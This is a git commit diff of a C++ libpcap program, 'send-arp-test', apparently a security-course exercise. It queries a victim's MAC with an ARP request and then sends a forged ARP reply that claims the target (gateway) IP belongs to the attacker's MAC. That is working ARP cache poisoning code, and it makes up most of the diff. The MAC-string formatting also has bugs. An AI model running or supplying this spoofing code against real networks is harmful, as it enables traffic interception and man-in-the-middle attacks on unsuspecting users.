97192014f4635d0167833903688e9f9dc1c329be
black6765 <black6765@gmail.com>
2020-08-03 19:21:29 +0900

    Covert string sender mac

--- src/main.cpp
+++ src/main.cpp
@@ -6,13 +6,15 @@
 #include "find_attacker_ip.h"
 
 #pragma pack(push, 1)
-struct EthArpPacket {
+struct EthArpPacket
+{
 	EthHdr eth_;
 	ArpHdr arp_;
 };
 #pragma pack(pop)
 
-void usage() {
+void usage()
+{
 	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
 	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
 }
@@ -33,63 +35,68 @@ int main(int argc, char* argv[]) {
 	char attacker_mac[20];
 	char sender_mac[20];
 	char attacker_ip[40];
+	char temp[10];
+	char temp2[10];
 	// find attacker's mac address
-	find_mac(attacker_mac, argv); 
+	find_mac(attacker_mac, argv);
 	// print attacker's mac address
 	printf("My MAC : %s\n", attacker_mac);
 	find_ip(attacker_ip, argv);
 	printf("My IP : %s\n", attacker_ip);
 	///////////////////////////////////////////////
-  	
-	
+
+
 
 	EthArpPacket packet;
-	
+
 	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-        packet.eth_.smac_ = Mac(attacker_mac);
-        packet.eth_.type_ = htons(EthHdr::Arp);
+	packet.eth_.smac_ = Mac(attacker_mac);
+	packet.eth_.type_ = htons(EthHdr::Arp);
 
-        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-        packet.arp_.pro_ = htons(EthHdr::Ip4);
-        packet.arp_.hln_ = Mac::SIZE;
-        packet.arp_.pln_ = Ip::SIZE;
-        packet.arp_.op_ = htons(ArpHdr::Request);
-        packet.arp_.smac_ = Mac(attacker_mac);
-        packet.arp_.sip_ = htonl(Ip(attacker_ip));
-        packet.arp_.tmac_ = Mac("00:00:00:00:00");
-        packet.arp_.tip_ = htonl(Ip(argv[2]));	
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = Mac(attacker_mac);
+	packet.arp_.sip_ = htonl(Ip(attacker_ip));
+	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+	packet.arp_.tip_ = htonl(Ip(argv[2]));
+
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) 
+	{
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+
+	while (true)
+	{
+
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+
+		int res = pcap_next_ex(handle, &header, &packet);
+		if (res == 0) continue;
+		if (res == -1 || res == -2)
+		{
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+
+		// Check ARP Packet
+		if (packet[12] == 0x08 && packet[13] == 0x06)
+		{
+			for (i = 0; i < 6; i++)
+			{
+				sprintf(temp, "%x:", packet[i + 6]);
+				strcpy(sender_mac + i * 3, temp);
+			}
+			sender_mac[17] = '\0';
+
+			break;
+		}
+	}
 	
-   	while (true) {
-
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
-        }
-
-	// Check TCP Packet
-        if(packet[12] != 0x08 && packet[13] == 0x06)
-        	continue;
-        
-	// Print TCP Packet Information
-        for(i=0; i<6; i++)
-		printf("%x:", packet[i+6]);
-        
-        // Print Captured Bytes 
-        printf("\n\n%u bytes captured\n", header->caplen);
-        break;
-        printf("\n====================================================\n");
-    }
-    
-    printf("%s", sender_mac);
- 
-
-	
-	/*
 	packet.eth_.dmac_ = Mac(sender_mac);
 	packet.eth_.smac_ = Mac(attacker_mac);
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -103,12 +110,8 @@ int main(int argc, char* argv[]) {
 	packet.arp_.sip_ = htonl(Ip(argv[3]));
 	packet.arp_.tmac_ = Mac(sender_mac);
 	packet.arp_.tip_ = htonl(Ip(argv[2]));
-	*/
-		
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-	
+
+	printf("%s\n", sender_mac);
+
 	pcap_close(handle);
 }
